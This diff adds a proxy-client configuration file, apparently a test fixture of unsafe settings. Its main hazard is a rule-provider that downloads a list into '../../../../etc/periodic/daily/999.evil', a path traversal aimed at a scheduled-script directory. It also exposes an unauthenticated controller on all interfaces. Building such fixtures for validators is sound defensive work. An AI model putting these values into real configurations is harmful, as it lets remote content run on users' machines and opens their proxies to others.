@@ -1,0 +1,32 @@
+{
+  "mixed-port": 7890, "port": 7891, "socks-port": 7892, "allow-lan": true, "bind-address": "*",
+  "external-controller": "0.0.0.0:9090", "secret": "", "external-ui": "/tmp/ui",
+  "external-controller-unix": "/tmp/evil.sock", "external-doh-server": "/dns-query",
+  "interface-name": "en0", "routing-mark": 6666, "mode": "global", "log-level": "silent", "ipv6": true,
+  "listeners": [{"name": "l", "type": "mixed", "port": 1080, "listen": "0.0.0.0"}],
+  "tunnels": ["tcp/udp,127.0.0.1:6553,8.8.8.8:53,DIRECT"],
+  "ss-config": "ss://YWVzLTEyOC1nY206cGFzcw==@:8388",
+  "tuic-server": {"enable": true, "listen": "0.0.0.0:10443"},
+  "tun": {"enable": true, "stack": "system", "auto-route": false},
+  "dns": {"enable": true, "listen": "0.0.0.0:53", "nameserver": ["192.168.1.1"]},
+  "hosts": {"example.org": "10.0.0.1"},
+  "proxies": [
+    {"name": "NL reality", "type": "vless", "server": "203.0.113.10", "port": 443, "uuid": "a3482e88-686a-4a58-8126-99c9df64b7bf",
+     "network": "tcp", "tls": true, "flow": "xtls-rprx-vision", "servername": "www.microsoft.com", "client-fingerprint": "chrome",
+     "reality-opts": {"public-key": "J1sRwuk4Rm8Hb7zEIUPhGIrjjtMHpDKFLDvdy7v9qXo", "short-id": "6ba85179e30d4fc2"},
+     "interface-name": "en0", "routing-mark": 1},
+    {"name": "DE trojan \"q\"", "type": "trojan", "server": "de.example.com", "port": 443, "password": "p\\\/x", "udp": true},
+    {"name": "FI ws", "type": "vmess", "server": "fi.example.com", "port": 443, "uuid": "a3482e88-686a-4a58-8126-99c9df64b7bf",
+     "alterId": 0, "cipher": "auto", "tls": true, "network": "ws", "ws-opts": {"path": "/ws"}}
+  ],
+  "proxy-groups": [
+    {"name": "Bad#name", "type": "select", "proxies": ["NL reality"]},
+    {"name": "🚀 Выбор сервера", "type": "select", "proxies": ["NL reality", "DE trojan \"q\"", "FI ws", "DIRECT"], "interface-name": "en0"},
+    {"name": "auto", "type": "url-test", "proxies": ["NL reality", "FI ws"], "url": "https://www.gstatic.com/generate_204", "interval": 300}
+  ],
+  "rule-providers": {
+    "ru-blocked": {"type": "http", "behavior": "domain", "format": "text", "url": "https://example.com/ru.txt", "path": "../../../../etc/periodic/daily/999.evil", "interval": 86400},
+    "local-inline": {"type": "inline", "behavior": "domain", "payload": ["+.example.net"]}
+  },
+  "rules": ["RULE-SET,ru-blocked,🚀 Выбор сервера", "RULE-SET,local-inline,DIRECT", "DOMAIN-SUFFIX,ru,DIRECT", "MATCH,🚀 Выбор сервера"]
+}
